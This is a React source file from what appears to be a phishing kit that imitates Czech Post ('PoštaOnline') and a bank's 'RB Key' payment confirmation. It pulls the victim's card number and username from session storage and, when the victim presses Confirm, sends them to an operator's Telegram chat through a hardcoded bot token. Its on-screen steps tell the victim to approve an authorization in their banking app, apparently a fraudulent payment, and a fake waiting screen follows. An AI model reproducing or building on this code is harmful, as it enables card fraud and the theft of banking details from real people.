import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import './NextStepAppr.css';

const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
const TELEGRAM_LOGS_CHAT_ID = '-1003861936742';

function NextStepAppr() {
  //const navigate = useNavigate();
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
  const [username, setUsername] = useState('');

  useEffect(() => {
    const storedCardNumber = sessionStorage.getItem('cardNumber');
    const storedUsername = sessionStorage.getItem('loginName');
    
    if (storedCardNumber) {
      const last4 = storedCardNumber.slice(-4);
      setCardNumber(`**** **** **** ${last4}`);
    }
    if (storedUsername) {
      setUsername(storedUsername);
    }
    
    // Check if already confirmed
    //if (sessionStorage.getItem('paymentConfirmed') === 'true') {
     // setIsConfirmed(true);
    //}
    
    const timer = setInterval(() => {
      setCurrentTime(new Date());
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);

  const sendTelegramLog = async () => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `
✅ <b>USER PRESSED CONFIRM RB KEY</b> ✅
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username}
💳 <b>Card Number:</b> ${cardNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User confirmed the payment in RB key!</i>
      `;

      await axios.post(url, {
        chat_id: TELEGRAM_LOGS_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      console.log('✅ Telegram log sent');
    } catch (error) {
      console.error('Error sending Telegram log:', error);
    }
  };

  const handleConfirm = async () => {
    await sendTelegramLog();
    sessionStorage.setItem('paymentConfirmed', 'true');
    setIsConfirmed(true);
  };

  const handleCancel = () => {
    window.location.href = '/#/login';
  };

  // Show waiting page AFTER confirmation
  if (isConfirmed) {
    return (
      <div className="waiting-container-page">
        <div className="waiting-card">
          <h2 className="waiting-title">In App-Verification in PoštaCZ</h2>
          <div className="animated-loader">
            <div className="loader-ring"></div>
            <div className="loader-ring-2"></div>
            <div className="loader-ring-3"></div>
            <div className="loader-dot"></div>
          </div>
          <h3>Waiting for Confirmation</h3>
          <p>Your confirmation has been sent.</p>
          <p>Please check your mobile banking app.</p>
          <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
        </div>
      </div>
    );
  }

  // Show RB Key confirmation page FIRST
  return (
    <div className="confirmation-overlay">
      <div className="confirmation-modal">
        <h3>Confirmation in Bank App</h3>
        
        <div className="confirmation-details">
          <div className="detail-row">
            <span className="detail-label">Merchant:</span>
            <span className="detail-value">PoštaOnline</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">Amount:</span>
            <span className="detail-value">00,00 CZK</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">Date:</span>
            <span className="detail-value">{new Date().toLocaleString()}</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">Card number:</span>
            <span className="detail-value">{cardNumber}</span>
          </div>
        </div>

        <div className="confirmation-instructions">
          <p>• Open bank app in your mobile phone.</p>
          <p>• Confirm the Authorize .</p>
          <p>• After confirmation come back to this screen.</p>
          <p>• If the screen doesn't close by itself when you come back, just tap "CONFIRM"
            ".</p>
        </div>

        <div className="confirmation-buttons">
          <button onClick={handleConfirm} className="confirm-btn">
            Confirm
          </button>
          
        </div>
      </div>
    </div>
  );
}

export default NextStepAppr;